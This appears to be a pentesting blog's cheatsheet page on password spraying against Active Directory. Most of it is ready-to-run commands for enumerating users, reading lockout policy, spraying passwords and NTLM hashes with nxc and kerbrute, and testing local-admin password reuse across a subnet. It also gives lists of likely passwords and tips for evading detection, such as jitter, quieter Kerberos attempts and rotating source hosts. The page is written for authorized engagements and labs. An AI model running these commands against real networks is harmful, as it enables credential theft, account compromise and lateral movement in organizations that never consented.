src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Active Directory Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/active-directory/ class=cheatsheet-sidebar-section>Active Directory Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/active-directory/00-ad-moc/ class=cheatsheet-sidebar-link>AD MOC</a></li><li><a href=/cheatsheets/active-directory/ad01-enumeration/ class=cheatsheet-sidebar-link>Enumeration</a></li><li><a href=/cheatsheets/active-directory/ad02-bloodhound/ class=cheatsheet-sidebar-link>BloodHound</a></li><li><a href=/cheatsheets/active-directory/ad03-kerberoasting/ class=cheatsheet-sidebar-link>Kerberoasting</a></li><li><a href=/cheatsheets/active-directory/ad04-as-rep-roasting/ class=cheatsheet-sidebar-link>AS-REP Roasting</a></li><li><a href=/cheatsheets/active-directory/ad05-password-spraying/ class="cheatsheet-sidebar-link is-current">Password Spraying</a></li><li><a href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/ class=cheatsheet-sidebar-link>LLMNR & NTLM Relay</a></li><li><a href=/cheatsheets/active-directory/ad07-acl-abuse/ class=cheatsheet-sidebar-link>ACL Abuse</a></li><li><a href=/cheatsheets/active-directory/ad08-delegation/ class=cheatsheet-sidebar-link>Delegation</a></li><li><a href=/cheatsheets/active-directory/ad09-adcs-esc1-16/ class=cheatsheet-sidebar-link>ADCS ESC1-16</a></li><li><a href=/cheatsheets/active-directory/ad10-lateral-movement/ class=cheatsheet-sidebar-link>Lateral Movement</a></li><li><a href=/cheatsheets/active-directory/ad11-credential-dumping/ class=cheatsheet-sidebar-link>Credential Dumping</a></li><li><a href=/cheatsheets/active-directory/ad12-dcsync/ class=cheatsheet-sidebar-link>DCSync</a></li><li><a href=/cheatsheets/active-directory/ad13-trust-attacks/ class=cheatsheet-sidebar-link>Trust Attacks</a></li><li><a href=/cheatsheets/active-directory/ad14-persistence/ class=cheatsheet-sidebar-link>Persistence</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>Password Spraying</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>Password Spraying</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Active Directory Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/active-directory/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/active-directory/00-ad-moc/ class=cheatsheet-mobile-sections-link>AD MOC</a></li><li><a href=/cheatsheets/active-directory/ad01-enumeration/ class=cheatsheet-mobile-sections-link>Enumeration</a></li><li><a href=/cheatsheets/active-directory/ad02-bloodhound/ class=cheatsheet-mobile-sections-link>BloodHound</a></li><li><a href=/cheatsheets/active-directory/ad03-kerberoasting/ class=cheatsheet-mobile-sections-link>Kerberoasting</a></li><li><a href=/cheatsheets/active-directory/ad04-as-rep-roasting/ class=cheatsheet-mobile-sections-link>AS-REP Roasting</a></li><li><a href=/cheatsheets/active-directory/ad05-password-spraying/ class="cheatsheet-mobile-sections-link is-current">Password Spraying</a></li><li><a href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/ class=cheatsheet-mobile-sections-link>LLMNR & NTLM Relay</a></li><li><a href=/cheatsheets/active-directory/ad07-acl-abuse/ class=cheatsheet-mobile-sections-link>ACL Abuse</a></li><li><a href=/cheatsheets/active-directory/ad08-delegation/ class=cheatsheet-mobile-sections-link>Delegation</a></li><li><a href=/cheatsheets/active-directory/ad09-adcs-esc1-16/ class=cheatsheet-mobile-sections-link>ADCS ESC1-16</a></li><li><a href=/cheatsheets/active-directory/ad10-lateral-movement/ class=cheatsheet-mobile-sections-link>Lateral Movement</a></li><li><a href=/cheatsheets/active-directory/ad11-credential-dumping/ class=cheatsheet-mobile-sections-link>Credential Dumping</a></li><li><a href=/cheatsheets/active-directory/ad12-dcsync/ class=cheatsheet-mobile-sections-link>DCSync</a></li><li><a href=/cheatsheets/active-directory/ad13-trust-attacks/ class=cheatsheet-mobile-sections-link>Trust Attacks</a></li><li><a href=/cheatsheets/active-directory/ad14-persistence/ class=cheatsheet-mobile-sections-link>Persistence</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>One password, many users. Stay under lockout. Get creds.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>DC</span><span class=o>=</span>10.10.11.50
+</span></span><span class=line><span class=cl><span class=nv>DOMAIN</span><span class=o>=</span>corp.local
+</span></span></code></pre></div><h2 id=i-lockout-policy-first data-heading-permalink=true><span class=heading-content>i. Lockout policy FIRST</span>
+<a class=heading-permalink href=#i-lockout-policy-first aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Spray without checking lockout = locked accounts = client incident. Always read the policy.</p><p>bloodyAD (read directly from domain object):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> get object <span class=s2>&#34;DC=corp,DC=local&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  --attr minPwdLength,lockoutThreshold,lockOutObservationWindow,lockoutDuration,maxPwdAge,minPwdAge
+</span></span></code></pre></div><p>Output keys to read:</p><ul><li><code>lockoutThreshold</code> - failed attempts before lockout (0 = no lockout, the dream)</li><li><code>lockOutObservationWindow</code> - time window for counting failures (negative number, divide by -600,000,000 for minutes)</li><li><code>lockoutDuration</code> - how long the account stays locked</li><li><code>minPwdLength</code> - informs password choices</li></ul><p>nxc shortcut:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --pass-pol
+</span></span><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --pass-pol
+</span></span></code></pre></div><p>Pre-auth: if lockoutThreshold is 0, spray freely. If it&rsquo;s 5, spray at most 4 attempts per user per window. Always leave a margin of 1.</p><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>Fine-Grained Password Policies (PSO)</span></div><div class=obsidian-callout-body><p>The default domain policy can be overridden per-group by PSOs. nxc has a module for this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> -M pso
+</span></span></code></pre></div><p>Check before spraying privileged users, they often have stricter lockout.</p></div></div><h2 id=ii-build-a-user-list data-heading-permalink=true><span class=heading-content>ii. Build a user list</span>
+<a class=heading-permalink href=#ii-build-a-user-list aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>If you don&rsquo;t have creds yet, kerbrute-enum first:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kerbrute userenum -d <span class=nv>$DOMAIN</span> --dc <span class=nv>$DC</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.valid
+</span></span></code></pre></div><p>With creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --users-export users.txt
+</span></span><span class=line><span class=cl><span class=c1>## or via LDAP filter for active accounts only (exclude disabled, exclude machine accounts):</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> get search <span class=se>\
+</span></span></span><span class=line><span class=cl>  --filter <span class=s1>&#39;(&amp;(objectClass=user)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  --attr samaccountname &gt; users.raw
+</span></span><span class=line><span class=cl>grep -i samaccountname users.raw <span class=p>|</span> awk <span class=s1>&#39;{print $NF}&#39;</span> &gt; users.txt
+</span></span></code></pre></div><h2 id=iii-nxc-spray data-heading-permalink=true><span class=heading-content>iii. nxc spray</span>
+<a class=heading-permalink href=#iii-nxc-spray aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The default behavior is &ldquo;exit on first success&rdquo;. For spraying you almost always want <code>--continue-on-success</code>.</p><p>Single password, many users:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u users.txt -p <span class=s1>&#39;Winter2024!&#39;</span> --continue-on-success
+</span></span></code></pre></div><p>Multiple passwords against one user (brute force, only when no lockout):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u Administrator -p passwords.txt --continue-on-success
+</span></span></code></pre></div><p>One-to-one user:password matching (creds from a breach, no permutation):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+</span></span></code></pre></div><p>NTLM hash spray (PtH against multiple users):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u users.txt -H 8846f7eaee8fb117ad06bdd830b7586c --no-bruteforce --continue-on-success
+</span></span></code></pre></div><p>Throttle to dodge detection (random 2-5 second delay between attempts):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u users.txt -p <span class=s1>&#39;Winter2024!&#39;</span> --jitter 2-5 --continue-on-success
+</span></span><span class=line><span class=cl><span class=c1>## Hardcoded 3-second delay:</span>
+</span></span><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u users.txt -p <span class=s1>&#39;Winter2024!&#39;</span> --jitter <span class=m>3</span> --continue-on-success
+</span></span></code></pre></div><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>Auth throttling is per-host</span></div><div class=obsidian-callout-body><p>If you spray multiple DCs with the same user list, each DC counts failures independently. Same user, two failed attempts on two DCs = two failures across the domain (DC replicates lockout counters in modern AD), but jitter is local to your run, not domain-aware. Slow down.</p></div></div><h2 id=iv-pick-the-protocol data-heading-permalink=true><span class=heading-content>iv. Pick the protocol</span>
+<a class=heading-permalink href=#iv-pick-the-protocol aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Some protocols don&rsquo;t fail-lock the account on bad password:</p><ul><li><strong>kerberos (kerbrute)</strong> - pre-auth failures DO count toward lockout in modern AD, but the logs are cleaner</li><li><strong>smb</strong> - counts toward lockout, generates 4625 events</li><li><strong>ldap</strong> - counts toward lockout</li><li><strong>winrm</strong> - counts toward lockout, often less monitored</li><li><strong>rdp</strong> - counts toward lockout, very noisy in logs</li></ul><p>When in doubt, use Kerberos (kerbrute). Pre-auth errors are quieter than 4625 SMB events.</p><p>kerbrute passwordspray:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kerbrute passwordspray -d <span class=nv>$DOMAIN</span> --dc <span class=nv>$DC</span> users.txt <span class=s1>&#39;Winter2024!&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>## With delay (seconds):</span>
+</span></span><span class=line><span class=cl>kerbrute passwordspray -d <span class=nv>$DOMAIN</span> --dc <span class=nv>$DC</span> users.txt <span class=s1>&#39;Winter2024!&#39;</span> --delay <span class=m>1000</span>
+</span></span><span class=line><span class=cl><span class=c1>## Output to file:</span>
+</span></span><span class=line><span class=cl>kerbrute passwordspray -d <span class=nv>$DOMAIN</span> --dc <span class=nv>$DC</span> users.txt <span class=s1>&#39;Winter2024!&#39;</span> -o spray.out
+</span></span></code></pre></div><div class="obsidian-callout callout-tip"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5.0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5s3 3.5 3 5.5A7 7 0 115 15c0-1.153.433-2.294 1-3a2.5 2.5.0 002.5 2.5z"/></svg></div><span class=obsidian-callout-title>User format matters</span></div><div class=obsidian-callout-body><p>kerbrute wants <code>samaccountname</code> only (no domain prefix). nxc accepts both <code>user</code> and <code>domain\user</code>. Strip domain prefixes before feeding into kerbrute.</p></div></div><h2 id=v-password-candidates data-heading-permalink=true><span class=heading-content>v. Password candidates</span>
+<a class=heading-permalink href=#v-password-candidates aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Without intel, common patterns in 2026 enterprises:</p><ul><li><code>Season + Year + !</code> → <code>Winter2025!</code>, <code>Summer2026!</code>, <code>Spring2024!</code></li><li><code>Company + 123</code> → <code>Acme123!</code>, <code>Contoso2024</code></li><li><code>Welcome + Year</code> → <code>Welcome2025!</code>, <code>Welcome123!</code></li><li><code>Password + N</code> → <code>Password123</code>, <code>Password1!</code></li><li><code>&lt;Domain shortname>1</code> → for <code>corp.local</code>, try <code>Corp1!</code>, <code>Corp2024!</code></li><li>The min password length + 1 capital + 1 number + 1 special is the lowest-effort policy compliance</li></ul><p>With intel from descriptions, comments, GPP:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --get-desc-users
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> get search <span class=se>\
+</span></span></span><span class=line><span class=cl>  --filter <span class=s1>&#39;(description=*)&#39;</span> --attr samaccountname,description <span class=p>|</span> grep -iE <span class=s1>&#39;pass|temp|init|defaul&#39;</span>
+</span></span></code></pre></div><h2 id=vi-reused-passwords-across-local--domain data-heading-permalink=true><span class=heading-content>vi. Reused passwords across local + domain</span>
+<a class=heading-permalink href=#vi-reused-passwords-across-local--domain aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Once you have a domain password, spray it as a LOCAL account too. Admins often reuse:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.10.11.0/24 -u Administrator -p <span class=s1>&#39;CrackedPass1!&#39;</span> --local-auth --continue-on-success
+</span></span></code></pre></div><p>This finds every machine where the local Administrator password equals the cracked domain password. Without LAPS, this is shockingly common.</p><h2 id=vii-reverse-spray-one-user-many-hashes data-heading-permalink=true><span class=heading-content>vii. Reverse spray (one user, many hashes)</span>
+<a class=heading-permalink href=#vii-reverse-spray-one-user-many-hashes aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you have a single high-value username and a database of leaked hashes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u Administrator -H hashes.txt --no-bruteforce --continue-on-success
+</span></span></code></pre></div><p>Useful when you found a hash dump (an old breach DB, a cache file) and want to test all hashes against one privileged account.</p><h2 id=viii-after-a-hit data-heading-permalink=true><span class=heading-content>viii. After a hit</span>
+<a class=heading-permalink href=#viii-after-a-hit aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Mark the user owned, re-collect BloodHound, check what new paths open up:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u found_user -p <span class=s1>&#39;FoundPass!&#39;</span> --shares
+</span></span><span class=line><span class=cl>nxc winrm <span class=nv>$DC</span> -u found_user -p <span class=s1>&#39;FoundPass!&#39;</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u found_user -p <span class=s1>&#39;FoundPass!&#39;</span> --host <span class=nv>$DC</span> get writable --bh
+</span></span></code></pre></div><p>Then spray that password against the rest of the domain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u users.txt -p <span class=s1>&#39;FoundPass!&#39;</span> --continue-on-success
+</span></span></code></pre></div><p>Reuse is the rule, not the exception. If one user has password X, expect 5-10 more to share it.</p><h2 id=ix-opsec data-heading-permalink=true><span class=heading-content>ix. OpSec</span>
+<a class=heading-permalink href=#ix-opsec aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Every failed login is a 4625 (interactive) or 4771 (Kerberos pre-auth fail) event on the DC</li><li>Spray slowly, one password per user per lockout-window-minus-margin</li><li>Use kerbrute when possible, less noisy than nxc on SMB</li><li>Rotate sources if you can pivot through multiple hosts</li><li>Avoid spraying weekends, traffic anomalies stand out more</li><li>On HTB and labs, lockout is usually disabled, fire as fast as you want</li></ul></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/active-directory/ad04-as-rep-roasting/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>AS-REP Roasting</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>LLMNR & NTLM Relay</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
